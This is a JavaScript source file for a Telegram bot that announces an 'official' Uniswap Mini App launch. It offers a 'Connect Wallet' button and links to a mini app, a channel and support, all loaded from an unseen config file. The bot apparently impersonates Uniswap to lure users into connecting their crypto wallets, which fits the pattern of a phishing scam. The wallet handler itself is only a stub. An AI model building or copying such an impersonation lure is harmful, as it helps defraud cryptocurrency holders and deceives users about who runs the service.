const { Telegraf, Markup } = require("telegraf");
const http = require("http");
const path = require("path");
const { token, botApp, chanel, suportt, twitter } = require("./urls.json");

const bot = new Telegraf(token);

bot.start((ctx) => {
  const imagePath = path.join(__dirname, "photo_2024-08-24_14-40-26.jpg");
  ctx.replyWithPhoto(
    { source: imagePath },
    {
      caption:
        `👏 Minting a new beginning on [Telegram](https://t.me/durov). We announce the official launch of the Mini App version of UniSwap.org.\n\n` +
        `💡 To open click on the following button.`,
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.url("🦄 Mini App", botApp)],
        [
          Markup.button.callback("Connect Wallet", "connect"),
          Markup.button.url("Twitter", twitter),
        ],
        [
          Markup.button.url("Chanel", chanel),
          Markup.button.url("Suportt", suportt),
        ],
      ]),
    }
  );
});

bot.action("connect", (ctx) => {
  ctx.reply("⏳ In progress...");
});

bot.launch();

const server = http.createServer((req, res) => {
  if (req.method === "GET" && req.url === "/status") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("Bot is running...");
  } else {
    res.writeHead(404, { "Content-Type": "text/plain" });
    res.end("Not Found");
  }
});

const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
